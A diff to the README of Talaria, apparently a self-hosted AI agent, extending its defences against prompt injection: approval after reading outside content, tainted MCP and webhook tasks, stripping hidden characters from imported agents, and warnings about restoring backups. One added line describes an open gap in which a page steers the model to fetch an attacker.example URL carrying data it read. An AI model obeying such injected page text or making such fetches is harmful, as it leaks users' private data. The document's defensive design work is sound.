@@ -479,7 +479,7 @@ the model says. This section is what that is, and what it is not.
 **After the conversation has read outside content, anything that could send something out asks first.** A web page, a
 tool's reply from a connected service, a subagent's report: once one has been read, the next `shell` command, the next send or
 delete or unrecognised tool of a connected service, opening a site not opened before in the browser, saving a note and
-starting a subagent all ask, even if you had allowed them, and the prompt says so ("shell (after reading outside content)").
+starting a subagent, writing a file that would run later by itself (a dotfile such as `.zshrc`, `.ssh`, a login item, a cron entry, a git hook, a CI workflow) and saving a skill all ask, even if you had allowed them, and the prompt says so ("shell (after reading outside content)").
 Reading, drafting, and anything you did not allow in the first place are unchanged. There is no Always button for these
 questions. Two things are exempt on purpose: a rule you wrote in the config (`"shell": "allow"`) is your own explicit choice and
 is honoured, and `-yolo` approves everything. Unattended runs (jobs, goals, watches) have nobody to ask, so for them the
@@ -526,7 +526,7 @@ permissions, and none are planned: it is not a service to host for other people.
 "not authorized" a few minutes apart at most and nothing else; an allowed chat is limited to 30 messages a minute, and
 the whole process to 1,000 requests to the model an hour (`"limits"` in the config; a negative number removes a limit).
 
-**What is not covered.** An injection that never needs a tool (the model simply tells you something false, or the page convinces
+**What is not covered.** Reading a web address is not asked about even after outside content, so a page that persuades the model to fetch `https://attacker.example/?d=<something it read>` could carry a little out that way; the guard stops sends, commands, writes that run later and the like, not fetches. An injection that never needs a tool (the model simply tells you something false, or the page convinces
 it to recommend something) is not stopped by any of this. A model asked to read your mail and summarise it will repeat
 what is in it. Approval prompts only help if you read them. Review status is in [SECURITY.md](SECURITY.md).
 
@@ -607,12 +607,12 @@ echo "check the build" | ./tal run --json -               # the prompt from stan
 ./tal mcp serve                                           # an MCP server on stdin/stdout, for Claude Desktop, Cursor and others
 ```
 
-`tal run` works without anyone to approve: a tool that needs approval is refused and listed in `denied`, unless you pass `--allow-risky` (or the global `-yolo`). It cannot schedule or start more work. The
+`tal run` works without anyone to approve: every tool that asks (shell and write_file included, not only deleting and posting) is refused and listed in `denied`, unless you pass `--allow-risky` (or the global `-yolo`). It cannot schedule or start more work. The
 exit code says how it went: **0** finished, **1** failed, **3** finished only as far as its rules allowed (something was refused), so a script can branch on it. `--agent` names a saved agent (its instructions, model and look-only limit apply), and
 `-profile` picks the model. The JSON has `ok`, `reply`, `error`, `tools` (each with its arguments, and `denied`), `usage` (requests and tokens, `estimated` when a count was guessed) and `seconds`.
 
 `tal mcp serve` is deliberately small. Add it to a client's config as a command, for example `{"mcpServers": {"talaria": {"command": "/path/to/tal", "args": ["mcp", "serve"]}}}`. It offers seven tools: **ask** (hand Talaria a
-piece of work: same unattended rules as `tal run`, never `allow_risky`), **agents**, **board**, **board_add** (adds to the Backlog: it starts nothing until you move the card to Ready), **tasks**, **while_away** and **usage**.
+piece of work: same unattended rules as `tal run`, never `allow_risky`, and it starts as a run that has already read outside content, because the client may have been steered by what it read), **agents**, **board**, **board_add** (adds to the Backlog: it starts nothing until you move the card to Ready), **tasks**, **while_away** and **usage**.
 It offers no way to approve anything, delete, change settings, read credentials or start a board card: a client can hand Talaria work, never lift one of its limits. Requests are handled one at a time; start a second server for a second client.
 It speaks JSON-RPC over lines, protocol versions 2024-11-05 to 2025-11-25, tools only. Logs go to stderr, never to the protocol stream.
 
@@ -1388,7 +1388,7 @@ in Review and failed, the last card it finished, its model tokens over the last 
   contacts, with **WORKING** while one of their board cards is running.
 - **Share an agent as one file.** **Share** on an agent saves `Name.agent.md`: a small header (`talaria-agent: 1`, name, icon, looks-only, and its description and tool areas when it has them) and the
   instructions, as plain text anyone can read. Nothing else goes in it: not its model profile (those are yours, with your keys), not memory, notes, goals,
-  conversations or anything about your machine. **Import an agent** reads such a file strictly (unknown settings are refused), shows the instructions in full, and
+  conversations or anything about your machine. **Import an agent** reads such a file strictly (unknown settings are refused, and invisible characters such as zero-width, direction-changing and "tag" characters are removed, so nothing can hide in the instructions you are shown), shows the instructions in full, and
   only then adds it: always without a model, and looking only unless you turn that off, whatever the file asked for. A name you already use is refused.
 
 ### Your phone (the Android app)
@@ -1571,7 +1571,7 @@ secret is kept. Call it with `POST /hooks/<id>` and `Authorization: Bearer <secr
 
 - It starts an ordinary background task (it shows under Tasks, and the limit of three at once applies; a full chat answers 429 with `Retry-After`). What the caller sent (up to 64 KB) is given to
   that task quoted as **untrusted data**, and the task starts as one that has already read outside content, so anything that could send something out is refused; it cannot ask you, and a webhook
-  never carries `allow_risky`. It can read, search, summarise, write documents and drafts.
+  never carries `allow_risky`. It can read, search, summarise, write documents and drafts. Pressing Retry on such a task, or writing a follow-up to it, keeps all of that (it stays marked, and keeps its agent's limits), and `while_away` counts as outside content too, since it repeats what those tasks reported.
 - A wrong secret or an unknown id gets the same plain 404, and an address that guesses wrongly 20 times in a minute is told to wait. A webhook can be paused, given a new secret (the old one stops at once) or
   deleted; each answers at most 60 calls an hour. At most 20 webhooks. The agent has no tool to make one: a webhook is a door into Talaria, and only you, signed in, decide who gets a key.
 - The door is on the web app's own address, so `TALARIA_WEB_PUBLIC_URL` (https) is what makes it reachable from outside. It is a separate handler from the signed-in app: it needs no cookie, and it can only do what is above.
@@ -1708,7 +1708,7 @@ would land outside the state folder, and writes owner-only. Stop the gateway bef
 **Back up or move from the app.** Settings → **Back up or move Talaria** downloads the same archive (`GET /api/backup`, signed in) and takes one back. To move to another server, download on the old one and choose the file on the new one:
 the upload is checked whole (a Talaria backup, only plain files and safe names, a size limit) and kept as `pending-restore.tar.gz`; nothing changes until the next start, because the state it replaces is in use now.
 At the next `tal gateway` start it is put in place **inside** the state folder (so it works when that folder is a mounted volume, as in Docker): each current entry is moved into `.before-restore-DATE` beside it, never deleted, and
-a backup that cannot be restored is set aside as `pending-restore.tar.gz.failed` and changes nothing. A backup does not carry the vault's key file: bring the passphrase or key file to the new server. The restore's own working files are left out of the next backup.
+a backup that cannot be restored is set aside as `pending-restore.tar.gz.failed` and changes nothing. A backup does not carry the vault's key file: bring the passphrase or key file to the new server. **A backup carries settings, and settings can start programs** (a connected service's `command`) and set what Talaria may do without asking, so restoring someone else's backup is running their settings: restore only your own. The page, the startup log and `tal restore` say what a backup's settings would start or change. Signed-in browsers (`web_sessions.json`) are never saved in a backup and never taken from one, so a restore cannot sign anyone in. An archive with more than 100,000 entries is refused. The restore's own working files are left out of the next backup.
 
 **Your conversations as training data.** `tal export [-o FILE] [-since DATE] [-archived] [-min-tools N]` (and Settings, or `GET /api/trajectories`) writes the kept web conversations as JSON Lines, one conversation per line, in the chat-completions message
 format (`user`, `assistant` with `tool_calls`, `tool` results) plus a few stats, the shape the common fine-tuning and evaluation tools read. Known secrets are scrubbed, pictures are replaced by a note, the system prompt (which carries your notes) and
